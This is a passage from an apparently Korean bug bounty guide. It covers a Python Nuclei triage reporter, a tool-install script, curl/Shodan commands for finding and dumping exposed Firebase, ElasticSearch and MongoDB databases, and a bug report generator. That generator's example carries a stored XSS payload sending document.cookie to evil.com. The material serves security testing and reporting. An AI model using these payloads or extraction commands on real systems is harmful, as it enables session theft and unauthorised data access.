        """간단한 False Positive 필터 — info 심각도 + 특정 태그."""
        fp_tags = {"ssl", "tls", "tech", "version-detect", "waf-detect"}
        return self.severity == "info" and bool(set(self.tags) & fp_tags)


def parse_nuclei_jsonl(path: Path) -> list[NucleiIssue]:
    """Nuclei JSONL 결과 파일 파싱."""
    issues: list[NucleiIssue] = []
    errors = 0

    with open(path, encoding="utf-8", errors="ignore") as f:
        for lineno, line in enumerate(f, 1):
            line = line.strip()
            if not line:
                continue
            try:
                r = json.loads(line)
            except json.JSONDecodeError:
                errors += 1
                continue

            info = r.get("info", {})
            classification = info.get("classification", {})

            issue = NucleiIssue(
                template_id=r.get("template-id", "unknown"),
                name=info.get("name", "Unknown"),
                severity=info.get("severity", "info").lower(),
                host=r.get("host", ""),
                matched_at=r.get("matched-at", ""),
                tags=info.get("tags", []) if isinstance(info.get("tags"), list)
                     else [t.strip() for t in str(info.get("tags", "")).split(",") if t.strip()],
                description=info.get("description", "")[:500],
                cvss_score=float(classification.get("cvss-score", 0) or 0),
                cve_id=classification.get("cve-id", [None])[0]
                       if isinstance(classification.get("cve-id"), list)
                       else str(classification.get("cve-id", "")),
                curl_command=r.get("curl-command", ""),
                extractor_data=r.get("extracted-results", {}),
                raw=r,
            )
            issues.append(issue)

    if errors:
        print(f"[!] 파싱 오류: {errors}줄 건너뜀")
    return issues


# ── 트리아지 로직 ─────────────────────────────────────────────────────────────

def deduplicate(issues: list[NucleiIssue]) -> list[NucleiIssue]:
    seen: set[str] = set()
    unique: list[NucleiIssue] = []
    for issue in issues:
        key = issue.dedup_key()
        if key not in seen:
            seen.add(key)
            unique.append(issue)
    removed = len(issues) - len(unique)
    if removed:
        print(f"[*] 중복 제거: {removed}개 제거 → {len(unique)}개 남음")
    return unique


def filter_false_positives(issues: list[NucleiIssue], aggressive: bool = False) -> list[NucleiIssue]:
    """False Positive 후보 필터링."""
    if not aggressive:
        return [i for i in issues if not i.is_false_positive_candidate()]
    # 공격적 필터: info 전체 제거
    return [i for i in issues if i.severity != "info"]


def group_by_severity(issues: list[NucleiIssue]) -> dict[str, list[NucleiIssue]]:
    grouped: dict[str, list[NucleiIssue]] = defaultdict(list)
    for issue in issues:
        grouped[issue.severity].append(issue)
    # 각 그룹 내 host 기준 정렬
    return {k: sorted(v, key=lambda i: i.host) for k, v in grouped.items()}


def group_by_host(issues: list[NucleiIssue]) -> dict[str, list[NucleiIssue]]:
    grouped: dict[str, list[NucleiIssue]] = defaultdict(list)
    for issue in issues:
        grouped[issue.host].append(issue)
    return {k: sorted(v, key=lambda i: i.severity_rank) for k, v in grouped.items()}


def calculate_host_risk_score(issues: list[NucleiIssue]) -> float:
    weights = {"critical": 10, "high": 7, "medium": 4, "low": 1, "info": 0}
    score = sum(weights.get(i.severity, 0) for i in issues)
    return min(score, 100.0)


# ── 보고서 생성 ───────────────────────────────────────────────────────────────

MARKDOWN_REPORT = """\
# Nuclei 취약점 트리아지 보고서

**생성일:** {{ now }}
**대상 파일:** {{ source }}
**총 발견:** {{ total }}개 | **고유:** {{ unique_count }}개

---

## 요약

| 심각도 | 발견 수 | 영향 호스트 |
|--------|---------|------------|
{% for sev in severity_order %}
{%- set items = by_severity.get(sev, []) %}
{%- if items %}
| {{ sev_icon[sev] }} {{ sev.upper() }} | {{ items|length }} | {{ items|map(attribute='host')|unique|list|length }} |
{%- endif %}
{% endfor %}
| **합계** | **{{ total }}** | **{{ host_count }}** |

---
{% for sev in severity_order %}
{%- set items = by_severity.get(sev, []) %}
{%- if items %}

## {{ sev_icon[sev] }} {{ sev.upper() }} ({{ items|length }}개)

{% for issue in items %}
### {{ issue.name }}

- **Template ID:** `{{ issue.template_id }}`
- **호스트:** `{{ issue.host }}`
- **위치:** `{{ issue.matched_at }}`
{%- if issue.cve_id %}- **CVE:** {{ issue.cve_id }}{% endif %}
{%- if issue.cvss_score > 0 %}- **CVSS:** {{ issue.cvss_score }}{% endif %}
{%- if issue.tags %}- **태그:** {{ issue.tags | join(', ') }}{% endif %}
{%- if issue.description %}

> {{ issue.description }}
{% endif %}
{%- if issue.curl_command %}

```bash
{{ issue.curl_command }}
```
{%- endif %}

{% endfor %}
{%- endif %}
{% endfor %}

---

## 호스트별 위험도

| 호스트 | 위험 점수 | Critical | High | Medium | Low |
|--------|-----------|---------|------|--------|-----|
{% for host, host_issues in by_host.items() | sort(attribute='1', key=lambda x: -calculate_risk(x[1])) %}
{%- set counts = host_issues | groupby('severity') | list %}
| {{ host }} | {{ "%.1f" | format(calculate_risk(host_issues)) }} | {% set c = host_issues | selectattr('severity', 'eq', 'critical') | list | length %}{{ c }} | {% set h = host_issues | selectattr('severity', 'eq', 'high') | list | length %}{{ h }} | {% set m = host_issues | selectattr('severity', 'eq', 'medium') | list | length %}{{ m }} | {% set l = host_issues | selectattr('severity', 'eq', 'low') | list | length %}{{ l }} |
{% endfor %}
"""

SEV_ICON = {
    "critical": "[CRITICAL]",
    "high": "[HIGH]",
    "medium": "[MEDIUM]",
    "low": "[LOW]",
    "info": "[INFO]",
    "unknown": "[?]",
}


def render_markdown(
    issues: list[NucleiIssue],
    source: str = "",
) -> str:
    by_severity = group_by_severity(issues)
    by_host = group_by_host(issues)
    host_count = len(set(i.host for i in issues))

    env = Environment(loader=BaseLoader(), autoescape=False)
    env.globals["calculate_risk"] = calculate_host_risk_score

    tmpl = env.from_string(MARKDOWN_REPORT)
    return tmpl.render(
        now=datetime.now().strftime("%Y-%m-%d %H:%M"),
        source=source,
        total=len(issues),
        unique_count=len(set(i.dedup_key() for i in issues)),
        by_severity=by_severity,
        by_host=by_host,
        severity_order=SEVERITY_ORDER,
        sev_icon=SEV_ICON,
        host_count=host_count,
    )


def render_json_summary(issues: list[NucleiIssue]) -> str:
    counts = Counter(i.severity for i in issues)
    by_host = group_by_host(issues)
    return json.dumps(
        {
            "generated_at": datetime.now().isoformat(),
            "total": len(issues),
            "by_severity": dict(counts),
            "host_risk": {
                host: {
                    "risk_score": calculate_host_risk_score(h_issues),
                    "issue_count": len(h_issues),
                    "severities": dict(Counter(i.severity for i in h_issues)),
                }
                for host, h_issues in sorted(
                    by_host.items(),
                    key=lambda x: -calculate_host_risk_score(x[1]),
                )
            },
            "issues": [
                {
                    "template_id": i.template_id,
                    "name": i.name,
                    "severity": i.severity,
                    "host": i.host,
                    "matched_at": i.matched_at,
                    "cve": i.cve_id,
                    "cvss": i.cvss_score,
                    "tags": i.tags,
                    "curl": i.curl_command,
                }
                for i in sorted(issues, key=lambda i: (i.severity_rank, i.host))
            ],
        },
        ensure_ascii=False,
        indent=2,
    )


# ── CLI ───────────────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Nuclei 결과 파서 + 자동 트리아지 보고서 생성기",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            """
            사용 예시:
              # nuclei 스캔 후 JSONL 생성
              nuclei -l targets.txt -j -o results.jsonl -severity low,medium,high,critical

              # 트리아지 보고서 생성
              python nuclei_triage.py results.jsonl
              python nuclei_triage.py results.jsonl -o triage.md --json-out triage.json
              python nuclei_triage.py results.jsonl --no-dedup --filter aggressive
            """
        ),
    )
    parser.add_argument("input", type=Path, help="Nuclei JSONL 결과 파일")
    parser.add_argument("-o", "--output", type=Path, default=None, help="Markdown 보고서 출력")
    parser.add_argument("--json-out", type=Path, default=None, help="JSON 요약 출력")
    parser.add_argument("--no-dedup", action="store_true", help="중복 제거 건너뜀")
    parser.add_argument(
        "--filter", choices=["none", "conservative", "aggressive"],
        default="conservative", help="FP 필터 수준 (기본: conservative)",
    )
    parser.add_argument(
        "--min-severity",
        choices=SEVERITY_ORDER, default="info",
        help="최소 심각도 필터 (기본: info)",
    )
    parser.add_argument("--host", help="특정 호스트만 표시")
    args = parser.parse_args()

    if not args.input.exists():
        sys.exit(f"[-] 파일 없음: {args.input}")

    print(f"[*] 파싱 중: {args.input}")
    issues = parse_nuclei_jsonl(args.input)
    print(f"[+] 파싱 완료: {len(issues)}개")

    if not args.no_dedup:
        issues = deduplicate(issues)

    if args.filter != "none":
        before = len(issues)
        issues = filter_false_positives(issues, aggressive=(args.filter == "aggressive"))
        removed = before - len(issues)
        if removed:
            print(f"[*] FP 필터: {removed}개 제거")

    # 최소 심각도 필터
    min_rank = SEVERITY_ORDER.index(args.min_severity)
    issues = [i for i in issues if i.severity_rank <= min_rank]

    # 특정 호스트 필터
    if args.host:
        issues = [i for i in issues if args.host in i.host]

    print(f"[+] 최종 이슈: {len(issues)}개")
    counts = Counter(i.severity for i in issues)
    for sev in SEVERITY_ORDER:
        if sev in counts:
            print(f"    {SEV_ICON[sev]} {sev.upper()}: {counts[sev]}")

    # 보고서 생성
    md_out = args.output or args.input.with_suffix(".triage.md")
    md_content = render_markdown(issues, source=str(args.input))
    md_out.write_text(md_content, encoding="utf-8")
    print(f"\n[+] Markdown 보고서: {md_out}")

    if args.json_out:
        json_content = render_json_summary(issues)
        args.json_out.write_text(json_content, encoding="utf-8")
        print(f"[+] JSON 요약: {args.json_out}")


if __name__ == "__main__":
    main()
```

---

## 9. 버그바운티 도구 설치 스크립트


배시 스크립트의 시작 부분입니다. `set -euo pipefail`을 추가하면 오류 발생 시 즉시 종료하는 안전한 스크립트를 작성할 수 있습니다.

```bash
#!/bin/bash
# setup_bugbounty.sh - 버그바운티 도구 일괄 설치

echo "[*] 버그바운티 도구 설치 시작..."

# Go 설치 확인
if ! command -v go &>/dev/null; then
    echo "[-] Go가 필요합니다: https://golang.org/dl/"
    exit 1
fi

# 정찰 도구
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/OWASP/Amass/v3/...@master
go install -v github.com/tomnomnom/assetfinder@latest
go install -v github.com/Findomain/Findomain@latest

# HTTP 프로브
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest

# 포트 스캔
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest

# URL 수집
go install -v github.com/tomnomnom/waybackurls@latest
go install -v github.com/lc/gau/v2/cmd/gau@latest
go install -v github.com/projectdiscovery/katana/cmd/katana@latest

# 디렉토리 브루트포스
go install -v github.com/ffuf/ffuf/v2@latest

# 취약점 스캐너
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# XSS
go install -v github.com/hahwul/dalfox/v2@latest

# 시크릿 탐지
go install -v github.com/gitleaks/gitleaks/v8@latest
pip3 install trufflehog

# JS 분석
go install -v github.com/GerbenJavado/LinkFinder@latest
npm install -g retire  # 취약한 JS 라이브러리 탐지

# 스크린샷
go install -v github.com/sensepost/gowitness@latest

echo "[+] 설치 완료!"
echo "PATH에 ~/go/bin 추가: echo 'export PATH=\$PATH:~/go/bin' >> ~/.bashrc"
```

---

## 9-2. Firebase / ElasticSearch / MongoDB 공개 DB 탐지

### Google Firebase 오설정
```bash
# Firebase Realtime Database 공개 접근 탐지
# 기본 URL 패턴: https://[project-id].firebaseio.com/.json

curl https://target-app.firebaseio.com/.json
# 응답에 데이터가 있으면 → 인증 없이 공개 접근 가능

# Firebase 규칙 확인
curl "https://target-app.firebaseio.com/.json?auth=" 

# 구글 도크로 Firebase URL 탐지
site:firebaseio.com "target"
# 또는 Shodan
shodan search "firebaseio.com"
```

### ElasticSearch 오설정 탐지
```bash
# ElasticSearch 인증 없이 공개된 경우
curl http://target.com:9200/
curl http://target.com:9200/_cat/indices   # 모든 인덱스 목록
curl http://target.com:9200/_search?pretty # 전체 데이터 검색

# Shodan 검색
shodan search "port:9200 elasticsearch"
shodan search 'port:9200 "cluster_name"'

# 인덱스 내 데이터 추출
curl http://target.com:9200/users/_search?size=100&pretty
```

### MongoDB 오설정 탐지
```bash
# MongoDB 기본 포트 (27017) 인증 없이 접근
# Shodan 검색
shodan search "port:27017 -authentication"

# MongoDB 클라이언트로 직접 접속
mongo target.com:27017
> show dbs
> use admin
> db.getCollectionNames()

# Nuclei MongoDB 탐지
nuclei -u target.com -tags mongodb,database,exposure
```

---

## 10. 보고서 자동 생성

```python
#!/usr/bin/env python3
"""버그 보고서 자동 생성기"""
from datetime import datetime

def generate_report(
    title: str,
    severity: str,
    cvss: float,
    endpoint: str,
    param: str,
    payload: str,
    response: str,
    impact: str,
    steps: list,
    remediation: str
) -> str:
    
    template = f"""# {title}

## 취약점 정보

| 항목 | 내용 |
|------|------|
| **심각도** | {severity} |
| **CVSS 점수** | {cvss} |
| **발견일** | {datetime.now().strftime('%Y-%m-%d')} |
| **상태** | 신규 |

---

## 요약

{title} 취약점이 `{endpoint}` 엔드포인트의 `{param}` 파라미터에서 발견되었습니다.
공격자는 이를 통해 {impact}

---

## 재현 단계

{"".join(f"{i+1}. {step}{chr(10)}" for i, step in enumerate(steps))}

### 요청

```
{payload}
```

### 응답

```
{response}
```

---

## 영향도

{impact}

---

## 수정 권고

{remediation}

---

## 참고 자료

- [OWASP](https://owasp.org)
- [CWE](https://cwe.mitre.org)
"""
    return template

# 사용 예시
if __name__ == "__main__":
    report = generate_report(
        title="Stored XSS via Comment Field",
        severity="High",
        cvss=7.4,
        endpoint="https://target.com/api/comment",
        param="content",
        payload='POST /api/comment\n\ncontent=<script>fetch("https://evil.com?c="+document.cookie)</script>',
        response='HTTP/1.1 200 OK\n{"status":"ok"}',
        impact="피해자 세션 쿠키 탈취, 계정 탈취 가능",
        steps=[
            "공격자 계정으로 로그인",
            "댓글 입력 필드에 XSS 페이로드 입력",
            "관리자가 해당 페이지 방문 시 쿠키 자동 전송",
        ],
        remediation="모든 사용자 입력값에 HTML 이스케이프 적용 (htmlspecialchars), Content-Security-Policy 헤더 설정"
    )
    
    with open("bug_report.md", "w") as f:
        f.write(report)
    print("[+] 보고서 생성: bug_report.md")
```
